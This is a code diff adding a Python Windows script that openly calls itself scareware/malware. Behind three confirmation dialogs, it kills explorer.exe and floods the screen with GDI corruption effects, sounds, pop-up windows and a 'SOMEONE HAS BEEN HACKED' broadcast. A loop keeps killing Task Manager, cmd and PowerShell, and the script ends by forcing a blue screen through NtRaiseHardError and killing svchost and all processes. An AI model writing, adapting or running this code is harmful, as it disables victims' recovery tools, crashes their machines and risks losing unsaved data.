@@ -1,0 +1,327 @@
+# BIG thanks to:
+#
+# @Leo-Aqua (GitHub)
+# |
+# |- Python GDI Effects Repository
+# '
+# @CodeSyncio (GitHub)
+# |
+# |- Python BSOD w/o admin
+# |- Memory Flooder (w/o file IO)
+# '
+
+import os
+
+if os.name != "nt":
+    print("This can only run on Windows Machines.")
+    exit(0)
+
+import ctypes
+import random
+from ctypes import wintypes
+import asyncio
+import math
+import win32gui
+import win32con
+import ctypes
+import winsound
+import psutil , time
+from multiprocessing import Process, Queue
+
+gdi32 = ctypes.windll.gdi32
+user32 = ctypes.windll.user32
+msimg32 = ctypes.windll.msimg32
+
+user32_blt = ctypes.WinDLL('user32')
+gdi32_blt = ctypes.WinDLL('gdi32')
+user32_blt.GetDesktopWindow.restype = wintypes.HWND
+hdc_screen = user32_blt.GetDC(None)
+current_screen_w = user32_blt.GetSystemMetrics(0)
+current_screen_h = user32_blt.GetSystemMetrics(1)
+hdc_mem = gdi32_blt.CreateCompatibleDC(hdc_screen)
+hbitmap = gdi32_blt.CreateCompatibleBitmap(hdc_screen, current_screen_w, current_screen_h)
+gdi32_blt.SelectObject(hdc_mem, hbitmap)
+
+user32 = ctypes.windll.user32
+user32.SetProcessDPIAware()
+[sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]
+
+BLOCK_SIZE = 1
+SRCCOPY = 0x00CC0020
+TRANSPARENT = 1
+size = 2
+
+
+screen_width = user32.GetSystemMetrics(0)
+screen_height = user32.GetSystemMetrics(1)
+hwnd = user32.GetDesktopWindow()
+hdc = user32.GetWindowDC(hwnd)
+
+fonts = ["Arial", "Times New Roman", "Courier New", "Comic Sans MS", 
+         "Impact", "Georgia", "Verdana", "Trebuchet MS"]
+
+AC_SRC_OVER = 0x00
+AC_SRC_ALPHA = 0x01
+
+class BLENDFUNCTION(ctypes.Structure):
+    _fields_ = [
+        ('BlendOp', ctypes.c_byte),
+        ('BlendFlags', ctypes.c_byte),
+        ('SourceConstantAlpha', ctypes.c_byte),
+        ('AlphaFormat', ctypes.c_byte)
+    ]
+
+class AtmosphericEffects:
+    def __init__(self, hwnd):
+        self.hwnd = hwnd
+        self.running = False
+        self.hdc = None
+        
+    def _get_window_size(self):
+        rect = wintypes.RECT()
+        user32.GetClientRect(self.hwnd, ctypes.byref(rect))
+        width = rect.right - rect.left
+        height = rect.bottom - rect.top
+        if width == 0 or height == 0:
+            width = user32.GetSystemMetrics(0)
+            height = user32.GetSystemMetrics(1)
+        return width, height
+    
+    async def fog_effect(self, duration=None, intensity=0.3, speed=0.02):
+        self.running = True
+        start_time = asyncio.get_event_loop().time()
+        offset = 0
+        while self.running:
+            if duration and (asyncio.get_event_loop().time() - start_time) > duration:
+                break
+            hdc = user32.GetDC(self.hwnd)
+            width, height = self._get_window_size()
+            mem_dc = gdi32.CreateCompatibleDC(hdc)
+            bitmap = gdi32.CreateCompatibleBitmap(hdc, width, height)
+            gdi32.SelectObject(mem_dc, bitmap)
+            for y in range(0, height, 20):
+                wave = int(30 * math.sin((y + offset) * 0.05))
+                brush = gdi32.CreateSolidBrush(0x00CCCCCC)
+                gdi32.SelectObject(mem_dc, brush)
+                gdi32.Rectangle(mem_dc, wave, y, width + wave, y + 15)
+                gdi32.DeleteObject(brush)
+            blend = BLENDFUNCTION(AC_SRC_OVER, 0, int(255 * intensity * 0.5), 0)
+            msimg32.AlphaBlend(hdc, 0, 0, width, height, mem_dc, 0, 0, width, height, blend)
+            gdi32.DeleteObject(bitmap)
+            gdi32.DeleteDC(mem_dc)
+            user32.ReleaseDC(self.hwnd, hdc)
+            offset += speed * 100
+            await asyncio.sleep(0.05)
+    
+    async def darkness_creep(self, duration=None, speed=1.0, direction='edges'):
+        self.running = True
+        start_time = asyncio.get_event_loop().time()
+        darkness = 0
+        while self.running:
+            if duration and (asyncio.get_event_loop().time() - start_time) > duration:
+                break
+            hdc = user32.GetDC(self.hwnd)
+            width, height = self._get_window_size()
+            if direction == 'edges':
+                size = int(min(darkness, min(width, height) // 3))
+                brush = gdi32.CreateSolidBrush(0x00000000)
+                gdi32.SelectObject(hdc, brush)
+                gdi32.Rectangle(hdc, 0, 0, width, size)
+                gdi32.Rectangle(hdc, 0, height - size, width, height)
+                gdi32.Rectangle(hdc, 0, 0, size, height)
+                gdi32.Rectangle(hdc, width - size, 0, width, height)
+                gdi32.DeleteObject(brush)
+            user32.ReleaseDC(self.hwnd, hdc)
+            darkness += speed
+            await asyncio.sleep(0.05)
+    
+    def stop(self):
+        self.running = False
+
+def create_random_font():
+    font_name = random.choice(fonts)
+    font_size = random.randint(20, 80)
+    weight = random.choice([400, 700])
+    italic = random.choice([0, 1])
+    return gdi32.CreateFontW(
+        font_size, 0, 0, 0, weight, italic, 0, 0, 0, 0, 0, 0, 0,
+        ctypes.c_wchar_p(font_name)
+    )
+
+def cascade_down(steps=50):
+    step_size = 20
+    for i in range(steps):
+        gdi32.BitBlt(hdc, 0, step_size, screen_width, screen_height - step_size,
+                     hdc, 0, 0, SRCCOPY)
+
+def cascade_right(steps=50):
+    step_size = 20
+    for i in range(steps):
+        gdi32.BitBlt(hdc, step_size, 0, screen_width - step_size, screen_height,
+                     hdc, 0, 0, SRCCOPY)
+
+def text(text_str, count=30):
+    gdi32.SetBkMode(hdc, TRANSPARENT)
+    for _ in range(count):
+        x = random.randint(0, screen_width - 200)
+        y = random.randint(0, screen_height - 100)
+        color = random.randint(0, 0xF00)
+        gdi32.SetTextColor(hdc, color)
+        hfont = create_random_font()
+        old_font = gdi32.SelectObject(hdc, hfont)
+        gdi32.TextOutW(hdc, x, y, text_str, len(text_str))
+        gdi32.SelectObject(hdc, old_font)
+        gdi32.DeleteObject(hfont)
+
+async def banlist():
+    banlist = ["taskmgr", "shutdown", "logoff", "wininit", "cmd", "powershell"]
+    while True:
+        for i in banlist:
+            os.system("taskkill /im "+i+".exe /f > NUL 2> NUL")
+    await asyncio.sleep(0)
+
+async def screen_distortion_task():
+    severity = 0
+    sounds = ["SystemQuestion","SystemAsterisk","SystemExit","SystemHand"]
+    starts = ["msedge https://www.google.com/", "notepad"]
+    for severity in range(2048):
+        # Make the user annoyed
+
+        if severity >= 1024:
+            os.system("start "+random.choice(starts))
+            os.system("msg * SOMEONE HAS BEEN HACKED...")
+
+        # Generate Woops text
+        text("Woops!")
+
+        # Play System Sounds
+        winsound.PlaySound(random.choice(sounds), winsound.SND_ALIAS + winsound.SND_ASYNC + winsound.SND_PURGE)
+
+        # SUPER MELT
+        if severity >= 512:
+            gdi32_blt.BitBlt(hdc_mem, 0, 0, current_screen_w, current_screen_h, hdc_screen, 0, 0, SRCCOPY)     
+            for idx, x in enumerate(range(0, current_screen_w, BLOCK_SIZE)):    
+                cascade_shift = BLOCK_SIZE - 5
+                gdi32_blt.BitBlt(hdc_screen, x + BLOCK_SIZE, cascade_shift + BLOCK_SIZE, 
+                                BLOCK_SIZE, current_screen_h, hdc_mem, x, cascade_shift, SRCCOPY)
+            gdi32_blt.BitBlt(hdc_mem, 0, 0, current_screen_w, current_screen_h, hdc_screen, 0, 0, SRCCOPY)
+            for x in range(0, current_screen_w, BLOCK_SIZE):
+                dy = random.randint(-5, 5)
+                gdi32_blt.BitBlt(hdc_screen, x, 0, BLOCK_SIZE, current_screen_h, hdc_mem, x, dy, SRCCOPY)
+
+        # MEMZ Tunnel Effect - @Leo-Aqua (GitHub)
+
+        if severity >= 16:
+            win32gui.StretchBlt(win32gui.GetDC(0),1,1,sw - size,sh - size,hdc,0,0,sw,sh,win32con.SRCCOPY)
+            win32gui.StretchBlt(win32gui.GetDC(0),int(size / 2),int(size / 2),sw - size,sh - size,hdc,0,0,sw,sh,win32con.SRCCOPY,)
+        
+        # FLASHING HELL Effect - @Leo-Aqua (GitHub)
+
+        if severity >= 128:
+            win32gui.BitBlt(win32gui.GetDC(0),0,0,user32.GetSystemMetrics(0),user32.GetSystemMetrics(1),win32gui.GetDC(0),random.randrange(-3, 4),random.randrange(-3, 4),win32con.NOTSRCCOPY,)
+
+        # CAMO Effect - @Leo-Aqua (GitHub)
+
+        if severity >= 256:
+            win32gui.BitBlt(win32gui.GetDC(0), random.randint(0, 666), random.randint(0, 666), user32.GetSystemMetrics(0), user32.GetSystemMetrics(1), win32gui.GetDC(0), random.randint(0, 666), random.randint(0, 666), win32con.NOTSRCERASE)
+
+        # ERRORS Effect - @Leo-Aqua (GitHub)
+
+        if severity >= 8:
+            if random.choice(range(25)) == 1:
+                x = y = 0
+                while True:
+                    win32gui.DrawIcon(hdc, x , y , win32gui.LoadIcon(None, win32con.IDI_ERROR,),)
+                    x = x + 30
+                    if x >= user32.GetSystemMetrics(0):
+                        y = y + 30
+                        x = 0
+                    if y >= user32.GetSystemMetrics(1):
+                        break
+
+        # Repurposed MELTING Effect - @Leo-Aqua (GitHub)
+
+        if severity >= 256:
+            win32gui.BitBlt(win32gui.GetDC(0), random.randint(0, user32.GetSystemMetrics(0)), 1, 10, user32.GetSystemMetrics(1), win32gui.GetDC(0), random.randint(0, user32.GetSystemMetrics(0)), 0, win32con.SRCCOPY)
+        
+        # Repurposed Spiral Pan Effect - @Leo-Aqua (GitHub)
+
+        if severity >= 4:
+            dx = dy = 1
+            angle = 0
+            while True:
+                win32gui.BitBlt(win32gui.GetDC(0), 0, 0, user32.GetSystemMetrics(0), user32.GetSystemMetrics(1), win32gui.GetDC(0), dx, dy, win32con.SRCCOPY)
+                dx = math.floor(math.ceil(math.sin(angle) * 10) / severity)
+                dy = math.floor(math.ceil(math.cos(angle) * 10) / severity)
+                angle += severity / 1000
+                if angle > math.pi :
+                    angle = math.pi * -1
+                if random.choice([True,False]):
+                    break
+        
+        # Streching Out Effect - @Leo-Aqua (GitHub)
+
+        if severity >= 512:
+            # Horizontal
+            win32gui.StretchBlt(win32gui.GetDC(0), -20, 0, user32.GetSystemMetrics(0) + 40, user32.GetSystemMetrics(1), win32gui.GetDC(0), 0, 0, user32.GetSystemMetrics(0), user32.GetSystemMetrics(1), win32con.SRCCOPY)
+            # Vertical
+            win32gui.StretchBlt(win32gui.GetDC(0), 0, -20, user32.GetSystemMetrics(0), user32.GetSystemMetrics(1) + 40, win32gui.GetDC(0), 0, 0, user32.GetSystemMetrics(0), user32.GetSystemMetrics(1), win32con.SRCCOPY)
+
+        # VOID Effect - @Leo-Aqua (GitHub)
+
+        if severity >= 16:
+            if random.choice(range(1000)) == 1:
+                win32gui.BitBlt(win32gui.GetDC(0),random.randint(1, 2),random.randint(1, 2),user32.GetSystemMetrics(0),user32.GetSystemMetrics(1),win32gui.GetDC(0),random.randint(1, 2),random.randint(1, 2),win32con.SRCAND,)
+
+        # Rotating TUNNEL Effect - @Leo-Aqua (GitHub)
+        if severity >= 256:
+            win32gui.PlgBlt(win32gui.GetDC(0),((win32gui.GetWindowRect(win32gui.GetDesktopWindow())[0] + 50, win32gui.GetWindowRect(win32gui.GetDesktopWindow())[1] - 50), (win32gui.GetWindowRect(win32gui.GetDesktopWindow())[2] + 50, win32gui.GetWindowRect(win32gui.GetDesktopWindow())[1] + 50), (win32gui.GetWindowRect(win32gui.GetDesktopWindow())[0] - 50, win32gui.GetWindowRect(win32gui.GetDesktopWindow())[3] - 50)),win32gui.GetDC(0),win32gui.GetWindowRect(win32gui.GetDesktopWindow())[0] - 20,win32gui.GetWindowRect(win32gui.GetDesktopWindow())[1] - 20,(win32gui.GetWindowRect(win32gui.GetDesktopWindow())[2] - win32gui.GetWindowRect(win32gui.GetDesktopWindow())[0]) + 40,(win32gui.GetWindowRect(win32gui.GetDesktopWindow())[3] - win32gui.GetWindowRect(win32gui.GetDesktopWindow())[1]) + 40,None,0,0,)
+        os.system('taskkill /IM taskmgr.exe /f')
+        severity += 1
+        await asyncio.sleep(0)
+
+    from ctypes import windll
+    from ctypes import c_int
+    from ctypes import c_uint
+    from ctypes import c_ulong
+    from ctypes import POINTER
+    from ctypes import byref
+    nullptr = POINTER(c_int)()
+    windll.ntdll.RtlAdjustPrivilege(c_uint(19) , c_uint(1) , c_uint(0) , byref(c_int()))
+    windll.ntdll.NtRaiseHardError(c_ulong(0xC000007B) , c_ulong(0) , nullptr , nullptr , c_uint(6) , byref(c_uint()))
+
+    os.system('taskkill /IM svchost.exe /f')
+    os.system('taskkill /FI "pid ge 0" /f')
+
+async def run_all_effects():
+    effects = AtmosphericEffects(hwnd)
+    await asyncio.gather(
+        screen_distortion_task(),
+        effects.fog_effect(intensity=0.015, speed=0.03),
+        banlist()
+    )
+
+if os.name != "nt":
+    print("This can only run on Windows Machines.")
+else:
+    os.system('taskkill /IM explorer.exe /f 2> NUL')
+    os.system('echo Set objShell = CreateObject("Shell.Application"): objShell.MinimizeAll > %temp%\\min.vbs & cscript //nologo %temp%\\min.vbs & del %temp%\\min.vbs')
+    from tkinter import *
+    from tkinter import messagebox
+    ask_stage_one = messagebox.askquestion("MALWARE!!!!", "THIS IS SCAREWARE / MALWARE!!!! DO YOU REALLY WANT TO RUN THIS??")
+    ask_stage_two = messagebox.askquestion("THINK ABOUT THIS!!!!", "ARE YOU SURE?? THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE OR DESTRUCTION CAUSED.")
+    ask_stage_three = messagebox.askquestion("BE ABSOLUTELY CERTAIN!", "REALLY?? ARE YOU LYING THAT YOU ARE ABSOLUTELY CERTAIN?")
+    if ask_stage_one == "yes" and ask_stage_two == "yes" and ask_stage_three == "no":
+        os.system('start explorer.exe')
+        messagebox.showinfo("", "Welp, Your fault.")
+    else:
+        os.system('start explorer.exe')
+        messagebox.showinfo("", "Bomb Deactivated.")
+        exit(0)
+
+try:
+    asyncio.run(run_all_effects())
+except KeyboardInterrupt:
+    pass
+except EOFError:
+    pass
